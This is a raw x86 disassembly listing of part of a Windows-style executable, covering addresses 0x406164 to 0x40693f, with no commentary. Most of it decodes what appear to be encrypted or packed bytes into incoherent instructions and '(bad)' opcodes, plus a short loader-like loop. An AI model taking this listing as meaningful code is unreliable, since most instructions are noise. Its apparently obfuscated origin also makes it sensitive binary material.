  406164:	or     BYTE PTR [esi+edi*4],dh
  406167:	pop    esp
  406168:	inc    esp
  406169:	(bad)  
  40616a:	pushf  
  40616b:	jl     0x406154
  40616d:	sti    
  40616e:	mov    dl,0xfb
  406170:	push   cs
  406171:	cmp    BYTE PTR [edi-0x3db4b0f4],bl
  406177:	aaa    
  406178:	or     al,0x80
  40617a:	xchg   edx,eax
  40617b:	pop    ds
  40617c:	pop    esi
  40617d:	shl    esp,0x78
  406180:	fsub   QWORD PTR [eax-0x5f]
  406183:	add    cl,dl
  406185:	jnp    0x406151
  406187:	dec    edi
  406188:	add    ebp,ecx
  40618a:	add    ah,BYTE PTR [ecx-0x3e]
  40618d:	or     ah,ah
  40618f:	fcom   QWORD PTR ds:0x62d0934c
  406195:	pop    ebp
  406196:	rep lock lods ax,WORD PTR ds:[esi]
  40619a:	pop    esp
  40619b:	jns    0x4061bf
  40619d:	dec    ebx
  40619e:	inc    esi
  40619f:	repz adc eax,esi
  4061a2:	retf   
  4061a3:	push   cs
  4061a4:	dec    edx
  4061a5:	shr    DWORD PTR [ebp+0x6c],cl
  4061a8:	jle    0x4061a8
  4061aa:	ins    BYTE PTR es:[edi],dx
  4061ab:	mov    ah,0x98
  4061ad:	loop   0x4061a2
  4061af:	jb     0x406230
  4061b1:	jb     0x406133
  4061b3:	pop    es
  4061b4:	(bad)  
  4061b5:	fld    DWORD PTR [ecx]
  4061b7:	std    
  4061b8:	mov    BYTE PTR [ecx+ebx*1+0x3272f6],al
  4061bf:	mov    eax,DWORD PTR [ebp+0xc]
  4061c2:	xor    eax,esi
  4061c4:	add    eax,edi
  4061c6:	pop    edi
  4061c7:	pop    esi
  4061c8:	pop    ebx
  4061c9:	leave  
  4061ca:	ret    0x8
  4061cd:	xor    eax,eax
  4061cf:	ret    
  4061d0:	push   ebp
  4061d1:	mov    ebp,esp
  4061d3:	sub    esp,0x38
  4061d6:	and    DWORD PTR ds:0x428ec7,0x0
  4061e0:	xor    eax,eax
  4061e2:	xor    eax,DWORD PTR ds:0x428ec7
  4061e8:	inc    eax
  4061e9:	mov    ds:0x428ec7,eax
  4061ee:	cmp    DWORD PTR ds:0x428ec7,0x24
  4061f5:	jg     0x406216
  4061fb:	jmp    0x406209
  406200:	push   DWORD PTR [ebp-0x18]
  406203:	call   DWORD PTR ds:0x42a9eb
  406209:	cmp    DWORD PTR ds:0x428ec7,0x19
  406210:	jb     0x4061e0
  406216:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  40621d:	push   ebx
  40621e:	mov    eax,ds:0x428e23
  406223:	adc    DWORD PTR ds:0x428e9f,eax
  406229:	jmp    0x4085d8
  40622e:	xchg   ebp,eax
  40622f:	(bad)
  406232:	xchg   edx,eax
  406233:	add    al,0x95
  406235:	(bad)
  406239:	stos   DWORD PTR es:[edi],eax
  40623a:	(bad)  
  40623b:	ins    DWORD PTR es:[edi],dx
  40623c:	mov    edx,0x833d0b88
  406241:	xor    ecx,0x60
  406244:	add    DWORD PTR [ebx-0x47089e2b],0xffffffb5
  40624b:	jp     0x4062a0
  40624d:	sbb    BYTE PTR [di-0x6494],0xd2
  406253:	inc    ebx
  406254:	add    ch,cl
  406256:	dec    ebx
  406257:	pop    ds
  406258:	jb     0x406298
  40625a:	dec    ecx
  40625b:	inc    esp
  40625c:	imul   esi,DWORD PTR [eax-0x3731b7da],0xffffff94
  406263:	pop    ds
  406264:	mov    esi,0x75f59908
  406269:	cmc    
  40626a:	pop    ecx
  40626b:	add    al,0x9
  40626d:	stc    
  40626e:	mov    BYTE PTR [edi],cl
  406270:	inc    eax
  406271:	rcr    edx,0x67
  406274:	mov    dl,0xcd
  406276:	mov    esp,gs
  406278:	lods   eax,DWORD PTR ds:[esi]
  406279:	jbe    0x40624e
  40627b:	mov    dh,0xba
  40627d:	or     esp,DWORD PTR [ecx-0xc1a6303]
  406283:	adc    al,0xdf
  406285:	test   BYTE PTR [edx+edx*1-0x41ce2320],dh
  40628c:	jmp    0x6a3e1453
  406291:	mov    cl,0x84
  406293:	out    0xdf,al
  406295:	xor    DWORD PTR [edx],ecx
  406297:	xchg   ecx,eax
  406298:	loopne 0x406236
  40629a:	dec    ebx
  40629b:	xchg   ebp,eax
  40629c:	mov    eax,ds:0x907cb07c
  4062a1:	mov    edi,?
  4062a3:	enter  0x69c3,0x19
  4062a7:	mov    esp,0x84e4a704
  4062ac:	cmp    cl,BYTE PTR [ebp+0x14]
  4062af:	dec    edx
  4062b0:	mov    dl,0x38
  4062b2:	inc    esi
  4062b3:	ficom  DWORD PTR [edx+esi*2]
  4062b6:	imul   ebp,DWORD PTR [esi],0x839f67b3
  4062bc:	imul   edi,esi,0x538365fe
  4062c2:	push   ds
  4062c3:	rol    edi,1
  4062c5:	ds jbe 0x40631e
  4062c8:	pop    ss
  4062c9:	dec    ebp
  4062ca:	sub    dh,bh
  4062cc:	test   DWORD PTR [ebp-0x4d],0xba3d402f
  4062d3:	data16 into 
  4062d5:	xchg   esi,eax
  4062d6:	shr    DWORD PTR [eax-0x62],cl
  4062d9:	add    eax,DWORD PTR [esi-0x1]
  4062dc:	add    cl,BYTE PTR [edx]
  4062de:	inc    eax
  4062df:	cs sbb BYTE PTR fs:[eax-0x77],0xae
  4062e5:	idiv   DWORD PTR [ebp+0xf840b2e]
  4062eb:	adc    eax,0x908dc74b
  4062f0:	pop    edi
  4062f1:	shl    esi,1
  4062f3:	ins    DWORD PTR es:[edi],dx
  4062f4:	test   al,0xbf
  4062f6:	stc    
  4062f7:	dec    esp
  4062f8:	mov    ds:0x5ae7bca9,al
  4062fd:	cmp    bl,al
  4062ff:	cmp    DWORD PTR [ecx+0x1],esi
  406302:	rcr    DWORD PTR [ebx],0xfb
  406305:	ss jbe 0x406295
  406308:	push   es
  406309:	adc    DWORD PTR [esi-0x3d],ebx
  40630c:	xchg   esi,eax
  40630d:	jge    0x4062bd
  40630f:	push   ebx
  406310:	inc    esi
  406311:	out    0xd6,al
  406313:	cmp    edx,DWORD PTR ds:0xe82962b5
  406319:	call   0x150ab696
  40631e:	(bad)  
  40631f:	push   ebx
  406320:	(bad)  
  406321:	mov    dh,0x52
  406323:	retf   0xb638
  406326:	ja     0x4062ec
  406328:	inc    ebx
  406329:	dec    BYTE PTR [edi]
  40632b:	jl     0x40637f
  40632d:	pop    ebp
  40632e:	xor    al,ch
  406330:	dec    edi
  406331:	fidivr DWORD PTR [esi]
  406333:	pop    ebp
  406334:	fsubp  st(2),st
  406336:	ror    BYTE PTR ds:0x483c4b0c,cl
  40633c:	pop    edx
  40633d:	push   eax
  40633e:	mov    ch,0xa0
  406340:	(bad)  
  406341:	mov    al,ds:0xe25e3c94
  406346:	mov    ah,0x48
  406348:	pop    ebp
  406349:	aam    0xc6
  40634b:	adc    cl,BYTE PTR [edx-0xfcc26af]
  406351:	dec    ebx
  406352:	int3   
  406353:	jle    0x4063d3
  406355:	mov    eax,0x30c56d9
  40635a:	jl     0x4062e1
  40635c:	je     0x4063bc
  40635e:	loopne 0x406325
  406360:	mov    ecx,0xde46520d
  406365:	(bad)  
  406366:	cmp    DWORD PTR [esi+0x61a34bb5],eax
  40636c:	lock call 0x231848bf
  406372:	sub    eax,0x27d28466
  406377:	popf   
  406378:	lea    esi,[ebp+0x1a]
  40637b:	add    DWORD PTR ds:0x955ce71d,0xffffffac
  406382:	fs xchg esi,eax
  406384:	push   ecx
  406385:	jnp    0x406333
  406387:	sti    
  406388:	(bad)  
  406389:	or     al,0xbe
  40638b:	out    dx,al
  40638c:	fwait
  40638d:	xchg   ebp,eax
  40638e:	xor    eax,0x8d2f11d0
  406393:	lods   al,BYTE PTR ds:[esi]
  406394:	call   0x1225:0x15cb218d
  40639b:	je     0x4063fa
  40639d:	iret   
  40639e:	jb     0x4063a4
  4063a0:	lea    ebp,[ebp-0x54]
  4063a3:	int3   
  4063a4:	dec    edx
  4063a5:	mov    ds:0xf28b1319,al
  4063aa:	cmp    ecx,DWORD PTR [ebx+0x29ce4b00]
  4063b0:	nop
  4063b1:	sahf   
  4063b2:	sbb    al,0x4c
  4063b4:	jmp    0x2c60:0x96db0a66
  4063bb:	adc    ch,BYTE PTR [ecx-0x28]
  4063be:	mov    al,al
  4063c0:	pop    eax
  4063c1:	jb     0x40634e
  4063c3:	scas   al,BYTE PTR es:[edi]
  4063c4:	jecxz  0x40634e
  4063c6:	pop    ecx
  4063c7:	scas   al,BYTE PTR es:[edi]
  4063c8:	xchg   ecx,eax
  4063c9:	imul   edx,DWORD PTR [esi+0x623e5d73],0xfffffff8
  4063d0:	outs   dx,BYTE PTR ds:[esi]
  4063d1:	cmp    ch,BYTE PTR [edx+0x183da658]
  4063d7:	gs imul ebx,eax,0x3b5891e6
  4063de:	pop    ebx
  4063df:	js     0x40639a
  4063e1:	pop    eax
  4063e2:	jo     0x40640d
  4063e4:	xchg   ecx,eax
  4063e5:	jp     0x4063a9
  4063e7:	pushf  
  4063e8:	shl    BYTE PTR cs:[ebp+0x26dd14f0],0x4
  4063f0:	pop    eax
  4063f1:	outs   dx,DWORD PTR ds:[esi]
  4063f2:	jbe    0x4063fd
  4063f4:	adc    BYTE PTR [edi+0x4a],ch
  4063f7:	xor    edi,DWORD PTR [eax-0x3fdb991e]
  4063fd:	inc    ebx
  4063fe:	nop
  4063ff:	test   al,0x3
  406401:	daa    
  406402:	lds    ebx,FWORD PTR [esi-0x53f6863f]
  406408:	(bad)  
  406409:	sub    BYTE PTR [ecx],dh
  40640b:	gs pop ss
  40640d:	cmp    ebp,ecx
  40640f:	mov    eax,ds:0x29cae780
  406414:	ins    DWORD PTR es:[edi],dx
  406415:	loope  0x4063b2
  406417:	(bad)  
  406418:	into   
  406419:	mov    edi,0x939d17b4
  40641e:	or     DWORD PTR [esi-0x75],ecx
  406421:	nop
  406422:	int3   
  406423:	sbb    edi,DWORD PTR [esi]
  406425:	ror    DWORD PTR [eax-0x645639d7],0x5d
  40642c:	xor    eax,0xfe742ad6
  406431:	cmp    ebx,DWORD PTR [ebx-0x1e]
  406434:	les    ebp,FWORD PTR [ecx-0x7b]
  406437:	and    al,0x40
  406439:	data16 sbb bl,BYTE PTR [edi*1-0x5ff68f6e]
  406441:	shl    DWORD PTR [edi+0x6c6670ab],1
  406447:	lahf   
  406448:	iret   
  406449:	ins    DWORD PTR es:[edi],dx
  40644a:	stos   BYTE PTR es:[edi],al
  40644b:	daa    
  40644c:	(bad)  
  40644d:	bnd ja 0x40643d
  406450:	faddp  st(3),st
  406452:	test   BYTE PTR ds:0xfd1a6a81,0x41
  406459:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40645a:	pavgb  xmm1,XMMWORD PTR [bx+0x2b]
  406460:	ret    
  406461:	lods   eax,DWORD PTR ds:[esi]
  406462:	mov    eax,0xab8c2f64
  406467:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406468:	fwait
  406469:	mov    cl,0xcd
  40646b:	fucomp st(2)
  40646d:	sub    BYTE PTR [esi-0x26],ch
  406470:	xlat   BYTE PTR ds:[ebx]
  406471:	mov    cl,0xab
  406473:	pop    edi
  406474:	dec    edi
  406475:	je     0x406406
  406477:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406478:	add    eax,DWORD PTR [edx-0x58c1fc25]
  40647e:	adc    DWORD PTR [edx+eax*4-0x1b],ebp
  406482:	pop    es
  406483:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406484:	call   0x2f5381a2
  406489:	fisubr DWORD PTR ds:0xff729c25
  40648f:	push   edx
  406490:	cmp    al,dl
  406492:	lahf   
  406493:	js     0x406462
  406495:	(bad)  
  406496:	sbb    DWORD PTR [ecx+0x49],0xffffffb4
  40649a:	sti    
  40649b:	(bad)  
  40649c:	fsubr  QWORD PTR [ebx+eiz*1]
  40649f:	shl    DWORD PTR [ecx-0x46],1
  4064a2:	jo     0x406488
  4064a4:	scas   al,BYTE PTR es:[edi]
  4064a5:	leave  
  4064a6:	es mov esi,0xae2e83d6
  4064ac:	lods   eax,DWORD PTR ds:[esi]
  4064ad:	mov    eax,0xb4ffb146
  4064b2:	cld    
  4064b3:	or     bl,dl
  4064b5:	cmp    BYTE PTR [ebp-0x7b],bl
  4064b8:	lods   al,BYTE PTR ds:[esi]
  4064b9:	jnp    0x406518
  4064bb:	mov    ebx,0xa4ec025d
  4064c0:	imul   eax,DWORD PTR [ecx],0x1b
  4064c3:	(bad)  
  4064c4:	dec    edx
  4064c5:	mov    ds:0xf810f0a2,al
  4064ca:	pop    esi
  4064cb:	xor    al,BYTE PTR ds:0xb68b8386
  4064d1:	xlat   BYTE PTR ds:[ebx]
  4064d2:	nop    DWORD PTR [ebx]
  4064d5:	rcl    DWORD PTR ds:[edi+0x7e454013],cl
  4064dc:	sub    eax,0x333d485f
  4064e1:	dec    ecx
  4064e2:	jge    0x4064de
  4064e4:	inc    esi
  4064e5:	xchg   esp,eax
  4064e6:	cwde   
  4064e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4064e8:	fmul   st(6),st
  4064ea:	test   eax,0x6b609111
  4064ef:	std    
  4064f0:	sbb    eax,0x3412d28d
  4064f5:	and    eax,0xf3899cc2
  4064fa:	std    
  4064fb:	xchg   ecx,eax
  4064fc:	add    ecx,DWORD PTR [ebp-0x4d]
  4064ff:	cmp    esp,DWORD PTR [ebp-0x527d4e41]
  406505:	or     ebp,DWORD PTR [edx+0x10]
  406508:	pop    ss
  406509:	enter  0xff62,0x1b
  40650d:	push   edi
  40650e:	frstor [esi]
  406510:	push   esp
  406511:	pop    edx
  406512:	dec    ecx
  406513:	inc    edi
  406514:	retf   
  406515:	dec    esi
  406516:	adc    eax,0xaefd7b9b
  40651b:	sub    bh,BYTE PTR [esi]
  40651d:	sbb    dh,BYTE PTR [ecx-0x24022c26]
  406523:	repnz or edx,DWORD PTR [ecx+0xc]
  406527:	sub    al,0x8f
  406529:	loopne 0x4064b9
  40652b:	cmp    DWORD PTR [esi-0x38ea6335],esi
  406531:	mov    eax,ds:0xb7ef3a9a
  406536:	das    
  406537:	ror    BYTE PTR [ebx+edx*8],cl
  40653a:	add    BYTE PTR [edx],ch
  40653c:	scas   al,BYTE PTR es:[edi]
  40653d:	fwait
  40653e:	aas    
  40653f:	enter  0x93e3,0x6
  406543:	lock sbb ebx,0xb7b872e7
  40654a:	aaa    
  40654b:	or     edi,DWORD PTR [esi+0x74]
  40654e:	xchg   ebx,eax
  40654f:	or     DWORD PTR [edx],0x5e34909
  406555:	adc    bl,BYTE PTR [ebx-0x5e]
  406558:	sti    
  406559:	fsubr  QWORD PTR [edx+0x35]
  40655c:	push   esp
  40655d:	push   ecx
  40655e:	pop    esi
  40655f:	call   0x6752:0x526db785
  406566:	adc    BYTE PTR [eax],al
  406568:	mov    ah,0x65
  40656a:	outs   dx,DWORD PTR ds:[esi]
  40656b:	retf   0xc7da
  40656e:	mov    ds:0x22a74f1e,eax
  406573:	fstp   TBYTE PTR [edx]
  406575:	sbb    BYTE PTR [eax-0x63c088fe],0xa3
  40657c:	dec    edx
  40657d:	jp     0x406546
  40657f:	pop    edi
  406580:	push   ecx
  406581:	push   ds
  406582:	dec    esi
  406583:	xchg   ebx,eax
  406584:	fcmovbe st,st(3)
  406586:	dec    ebp
  406587:	ds lock jg 0x4065ed
  40658b:	inc    ecx
  40658c:	mov    WORD PTR [ecx-0x5b16cfea],ss
  406592:	or     al,0x49
  406594:	out    0xb0,al
  406596:	or     eax,ebp
  406598:	jb     0x406616
  40659a:	hlt    
  40659b:	mov    WORD PTR [edi-0x3460f82d],fs
  4065a1:	mov    esi,DWORD PTR [ebx+0x58]
  4065a4:	or     bl,0xd0
  4065a7:	sub    dh,bh
  4065a9:	xchg   cl,al
  4065ab:	xchg   ch,cl
  4065ad:	frstor [edx+0x80be5d6]
  4065b3:	jno    0x4065f6
  4065b5:	fdivp  st(3),st
  4065b7:	pop    ebp
  4065b8:	(bad)  
  4065b9:	xor    eax,DWORD PTR [esi]
  4065bb:	mov    BYTE PTR [ebp+0x3ac731bc],cl
  4065c1:	xchg   esi,eax
  4065c2:	stos   DWORD PTR es:[edi],eax
  4065c3:	mov    dl,0x49
  4065c5:	sub    edi,esi
  4065c7:	lock mov ds:0xeae3a779,eax
  4065cd:	int    0x25
  4065cf:	push   0xa021264d
  4065d4:	and    esp,ebp
  4065d6:	pop    edx
  4065d7:	jecxz  0x4065ef
  4065d9:	adc    al,0x92
  4065db:	jbe    0x40659c
  4065dd:	or     DWORD PTR [edi+eiz*2+0x5],edi
  4065e1:	add    DWORD PTR [esp+esi*8],edx
  4065e4:	xor    ch,ch
  4065e6:	neg    DWORD PTR [edx+0x2cd812f9]
  4065ec:	sbb    eax,0x5ff89bae
  4065f1:	xor    al,0x99
  4065f3:	inc    eax
  4065f4:	add    eax,0x269f0c58
  4065f9:	xlat   BYTE PTR ds:[ebx]
  4065fa:	and    BYTE PTR [edi+0x6f],0xbd
  4065fe:	test   ebx,esp
  406600:	add    DWORD PTR [esi-0x37],0x28
  406604:	or     BYTE PTR [edx+0x6f22cfe9],ch
  40660a:	mov    esi,0xee5d78db
  40660f:	sbb    ebx,DWORD PTR cs:[ecx+0x724ff6a9]
  406616:	lods   al,BYTE PTR ds:[esi]
  406618:	xor    esi,DWORD PTR [eax-0x4f]
  40661b:	sub    BYTE PTR [ebx],ah
  40661d:	inc    esp
  40661e:	sbb    BYTE PTR [esi-0x5f5d055a],0xbf
  406625:	inc    eax
  406626:	xor    ah,cl
  406628:	push   edi
  406629:	xchg   ebx,eax
  40662a:	jne    0x4065ad
  40662c:	fadd   st,st(1)
  40662e:	mov    WORD PTR [edx-0x649c2552],cs
  406634:	push   eax
  406635:	dec    ebp
  406636:	mov    ecx,0xaf6d53f9
  40663b:	(bad)  
  40663c:	popa   
  40663d:	fs jmp 0x9417:0x8cfe69d0
  406645:	ins    DWORD PTR es:[edi],dx
  406646:	(bad)  
  406647:	lods   al,BYTE PTR ds:[esi]
  406648:	mov    bl,0xef
  40664a:	mov    esp,0x1d9db5ec
  40664f:	inc    ecx
  406650:	xchg   ecx,eax
  406651:	inc    esi
  406652:	sbb    ebp,edi
  406654:	add    esi,DWORD PTR [ebx+eiz*2+0xbef2e8b]
  40665b:	sub    al,0x5c
  40665d:	ins    BYTE PTR es:[edi],dx
  40665e:	sbb    DWORD PTR [edi+0x57c2d444],esi
  406664:	pop    ss
  406665:	fnclex 
  406667:	sub    al,0xa3
  406669:	sub    ebx,DWORD PTR [esi-0x741b1029]
  40666f:	xchg   edi,eax
  406670:	fdiv   st,st(4)
  406672:	std    
  406673:	pushf  
  406674:	push   ebx
  406675:	out    0x58,al
  406677:	je     0x406649
  406679:	or     dl,ch
  40667b:	mov    DWORD PTR [ecx+esi*4+0x3f],eax
  40667f:	or     ebp,edi
  406681:	fist   WORD PTR [ecx+0x62]
  406684:	pop    esi
  406685:	jmp    0xf067:0xac382fcd
  40668c:	sbb    BYTE PTR [edx+0x8b1d71a],bh
  406692:	fwait
  406693:	scas   eax,DWORD PTR es:[edi]
  406694:	or     BYTE PTR [esp+ebx*8+0x51],bh
  406698:	icebp  
  406699:	and    dl,BYTE PTR [ebx+0xa185c55]
  40669f:	inc    ecx
  4066a0:	cli    
  4066a1:	inc    eax
  4066a2:	sub    eax,0x5fed2941
  4066a7:	lods   eax,DWORD PTR ds:[esi]
  4066a8:	mov    ebx,0x2d0c44c7
  4066ad:	xchg   DWORD PTR [ebx+0x66],eax
  4066b0:	mov    ch,0x7f
  4066b2:	fwait
  4066b3:	ret    0xa59b
  4066b6:	push   ebx
  4066b7:	fld    DWORD PTR [eax]
  4066b9:	test   DWORD PTR gs:[eax-0x4a4a5381],edi
  4066c0:	xor    DWORD PTR [esp+esi*4-0x1],edx
  4066c4:	xchg   ecx,eax
  4066c5:	jns    0x40666d
  4066c7:	retf   0xdf85
  4066ca:	fsubr  st(7),st
  4066cc:	adc    BYTE PTR [edi+0xf0b6685],0x1b
  4066d3:	sbb    DWORD PTR [edi+0x1a],edx
  4066d6:	jae    0x406665
  4066d8:	mov    ds:0x58e4655,al
  4066dd:	std    
  4066de:	adc    bl,BYTE PTR [eax-0x71]
  4066e1:	adc    ebp,DWORD PTR gs:[esi-0x4221c4cf]
  4066e8:	shl    ch,0x8
  4066eb:	imul   ebx,DWORD PTR [edi+0x1aac22c0],0xc12420d
  4066f5:	clc    
  4066f6:	std    
  4066f7:	outs   dx,BYTE PTR ds:[esi]
  4066f8:	and    DWORD PTR [esi+0xb1bc5f5],ebx
  4066fe:	jg     0x4066f5
  406700:	push   edi
  406701:	and    DWORD PTR [edi-0x605dd619],eax
  406707:	cmp    eax,0xb85662d5
  40670c:	dec    esp
  40670d:	lock inc ebp
  40670f:	rol    DWORD PTR cs:[esi-0x67368abf],1
  406716:	or     al,0x3a
  406718:	dec    edi
  406719:	push   ds
  40671a:	bound  edi,QWORD PTR [edx]
  40671c:	fdivr  st(4),st
  40671e:	and    esp,ebp
  406720:	lea    eax,[eax+0x27499349]
  406726:	fdiv   st,st(3)
  406728:	sub    esp,DWORD PTR [edx+0x4657a0f9]
  40672e:	mov    dh,0x75
  406730:	fimul  DWORD PTR [ebx-0x6b]
  406733:	push   eax
  406734:	and    al,0x92
  406736:	fs popf 
  406738:	xor    ebx,eax
  40673a:	sbb    BYTE PTR [edx],cl
  40673c:	test   eax,0xb4bb1f24
  406741:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406742:	inc    edx
  406743:	fwait
  406744:	xor    eax,0xa57f092a
  406749:	(bad)  
  40674a:	lods   eax,DWORD PTR ds:[esi]
  40674b:	test   eax,0xf2a42937
  406750:	dec    esi
  406751:	aaa    
  406752:	or     BYTE PTR [ebx+ebp*2],0x54
  406756:	gs push edx
  406758:	xchg   ebx,eax
  406759:	iret   
  40675a:	push   eax
  40675b:	lea    ebx,[ecx-0x47]
  40675e:	std    
  40675f:	fild   QWORD PTR [edx]
  406761:	ss sbb eax,edi
  406764:	fwait
  406765:	stos   DWORD PTR es:[edi],eax
  406766:	into   
  406767:	in     eax,dx
  406768:	jns    0x406765
  40676a:	dec    BYTE PTR [ebx]
  40676c:	or     cl,BYTE PTR [eax-0x4968caa4]
  406772:	or     ebx,DWORD PTR [ebx+eax*4-0xd]
  406776:	int    0x80
  406778:	push   edx
  406779:	or     al,0xde
  40677b:	loopne 0x40675b
  40677d:	stos   BYTE PTR es:[edi],al
  40677e:	fs inc eax
  406780:	pop    ds
  406781:	push   ebx
  406782:	mov    al,0xd5
  406784:	pop    edi
  406785:	scas   al,BYTE PTR es:[edi]
  406786:	and    al,0xeb
  406788:	push   ebp
  406789:	js     0x40670b
  40678b:	lea    edx,[ebx+eax*4-0x9e72cfc]
  406792:	fstp   DWORD PTR [edi+ecx*2+0x69]
  406796:	adc    esp,eax
  406798:	add    DWORD PTR ds:0x7d14a5e6,esi
  40679e:	xchg   esp,eax
  40679f:	in     eax,0x3c
  4067a1:	test   BYTE PTR [ebp+0x323ba7db],dh
  4067a7:	cmp    bh,BYTE PTR [edx+0x59]
  4067aa:	inc    ebx
  4067ab:	dec    esi
  4067ac:	push   0x7a5fc1c
  4067b1:	pop    esp
  4067b2:	inc    esp
  4067b3:	cmp    DWORD PTR [ebx-0x2da3ec9b],ecx
  4067b9:	sbb    esi,DWORD PTR [bp+si-0x4a]
  4067bd:	data16 scas al,BYTE PTR es:[edi]
  4067bf:	stos   BYTE PTR es:[edi],al
  4067c0:	dec    ebx
  4067c1:	jecxz  0x4067df
  4067c3:	sub    cl,ah
  4067c5:	sub    eax,0x1f49f218
  4067ca:	arpl   WORD PTR es:[bp+si-0x64],ax
  4067cf:	jge    0x4067c3
  4067d1:	addr16 js 0x406836
  4067d4:	clc    
  4067d5:	mov    DWORD PTR [ebp+0x6],esp
  4067d8:	xlat   BYTE PTR ds:[ebx]
  4067d9:	and    BYTE PTR [edx-0x69c5ce7b],dh
  4067df:	push   ebp
  4067e0:	lds    ebx,FWORD PTR [ecx]
  4067e2:	imul   esi,DWORD PTR [ecx+0xfc16431],0x855a1af6
  4067ec:	inc    ebx
  4067ed:	jnp    0x406798
  4067ef:	scas   al,BYTE PTR es:[edi]
  4067f0:	mul    ch
  4067f2:	mov    ebx,0xb3384bbc
  4067f7:	add    DWORD PTR [esi],eax
  4067f9:	jb     0x40680c
  4067fb:	inc    edx
  4067fc:	loop   0x40684c
  4067fe:	popf   
  4067ff:	daa    
  406800:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406801:	into   
  406802:	dec    ecx
  406803:	sub    al,0x1b
  406805:	mov    bl,0xb7
  406807:	jne    0x406858
  406809:	fs hlt 
  40680b:	pop    edx
  40680c:	dec    sp
  40680e:	push   ebp
  40680f:	pop    ecx
  406810:	je     0x4067dd
  406812:	fisub  DWORD PTR [edi+0x49]
  406815:	cmp    ah,al
  406817:	into   
  406818:	mov    cl,0x87
  40681a:	sti    
  40681b:	pop    ss
  40681c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40681d:	xor    bh,BYTE PTR [ebx+0x414769a0]
  406823:	adc    DWORD PTR [ecx+0x4e5b564],ebx
  406829:	loope  0x406824
  40682b:	adc    cl,ah
  40682d:	inc    esi
  40682e:	and    al,0xb7
  406830:	in     al,dx
  406831:	sbb    DWORD PTR [edx],ecx
  406833:	push   ecx
  406834:	pop    esi
  406835:	or     ebx,DWORD PTR [edx-0x2ab599e2]
  40683b:	mov    dl,0x66
  40683d:	push   eax
  40683e:	scas   al,BYTE PTR es:[edi]
  40683f:	inc    esi
  406840:	push   0x64
  406842:	scas   eax,DWORD PTR es:[edi]
  406843:	stc    
  406844:	add    al,0x32
  406846:	mov    dl,0x8b
  406848:	xchg   bl,dl
  40684a:	inc    esi
  40684b:	leave  
  40684c:	retf   
  40684d:	mov    al,0x4a
  40684f:	into   
  406850:	cmp    al,0x5e
  406852:	cmp    bl,BYTE PTR [ebx-0x4c]
  406855:	pop    ecx
  406856:	sub    BYTE PTR [esi-0x6a],bl
  406859:	add    al,0xb9
  40685b:	jnp    0x406828
  40685d:	mov    ds:0x61b82d39,al
  406862:	mov    ebx,0xb8009d73
  406867:	call   DWORD PTR [edx+0x731909b8]
  40686d:	push   ebp
  40686e:	pop    edi
  40686f:	cmp    ecx,DWORD PTR [edx+ebx*2-0x6c]
  406873:	outs   dx,DWORD PTR ds:[esi]
  406874:	and    DWORD PTR [edi-0x4309569c],esp
  40687a:	(bad)  
  40687c:	daa    
  40687d:	mov    dh,0xef
  40687f:	aas    
  406880:	bound  esi,QWORD PTR [eax]
  406882:	jl     0x406807
  406884:	xor    BYTE PTR [edi],bh
  406886:	sub    BYTE PTR [esi-0x18fa68ec],dh
  40688c:	xor    esi,DWORD PTR [eax+0x6e2acc6b]
  406892:	inc    ecx
  406893:	sar    BYTE PTR [ebx+ebx*2],cl
  406896:	fiadd  DWORD PTR [eax]
  406898:	loopne 0x406821
  40689a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40689b:	mov    dl,0xd2
  40689d:	xchg   esp,eax
  40689e:	push   esi
  40689f:	inc    esp
  4068a0:	leave  
  4068a1:	test   ah,0x3c
  4068a4:	inc    ebp
  4068a5:	cmp    ah,BYTE PTR [ebp+esi*4+0x2d]
  4068a9:	dec    edi
  4068aa:	(bad)  
  4068ab:	shr    BYTE PTR [esi-0x12],1
  4068ae:	hlt    
  4068af:	imul   ebx,DWORD PTR [edx+0x38],0x53
  4068b3:	xor    DWORD PTR [ebp+0x54],0x7c
  4068b7:	jmp    0x406875
  4068b9:	push   esi
  4068ba:	int    0x72
  4068bc:	fistp  QWORD PTR [ebx-0x6877e0c9]
  4068c2:	addr16 jbe 0x4068e3
  4068c5:	shr    ebp,cl
  4068c7:	pusha  
  4068c8:	sub    BYTE PTR [esi+0xd],0x21
  4068cc:	push   edi
  4068cd:	jo     0x4068b6
  4068cf:	inc    edi
  4068d0:	enter  0xfc1d,0xa
  4068d4:	jne    0x40687e
  4068d6:	add    eax,0x98c5af34
  4068db:	push   ds
  4068dc:	xchg   edi,eax
  4068dd:	push   edi
  4068de:	push   es
  4068df:	sahf   
  4068e0:	test   DWORD PTR [ecx-0x80],esi
  4068e3:	push   es
  4068e4:	jp     0x4068d3
  4068e6:	xor    ch,BYTE PTR [ecx-0x6e0a9047]
  4068ec:	or     eax,0x4bd1415b
  4068f1:	rcl    DWORD PTR [edx+0x3a],cl
  4068f4:	outs   dx,BYTE PTR ds:[esi]
  4068f5:	mov    esi,0xafc61a51
  4068fa:	popa   
  4068fb:	mov    ah,0x35
  4068fd:	jmp    0x4068dc
  4068ff:	scas   eax,DWORD PTR es:[edi]
  406900:	data16 xor BYTE PTR [edi+ebx*8+0x5fbc7b60],dl
  406908:	outs   dx,DWORD PTR ds:[esi]
  406909:	sub    al,0x79
  40690b:	scas   eax,DWORD PTR es:[edi]
  40690c:	(bad)  [eax]
  40690e:	loope  0x406925
  406910:	aas    
  406911:	push   edi
  406912:	popf   
  406913:	popf   
  406914:	(bad)  
  406915:	outs   dx,BYTE PTR ds:[esi]
  406916:	sub    al,0x12
  406918:	and    eax,0xb5807993
  40691d:	cdq    
  40691e:	setns  cl
  406921:	pop    edx
  406922:	xchg   esi,eax
  406923:	fld    QWORD PTR [esi]
  406925:	test   BYTE PTR [esi+0x6a],0xa0
  406929:	push   ds
  40692a:	jmp    0x40698e
  40692c:	(bad)  
  40692d:	(bad)  
  40692e:	mov    ss,WORD PTR [ebx]
  406930:	jp     0x406909
  406932:	imul   ecx,DWORD PTR [ebx-0x15ca2ccb],0x7
  406939:	dec    esp
  40693a:	sbb    eax,0x3b403bcc
  40693f:	jae    0x406927
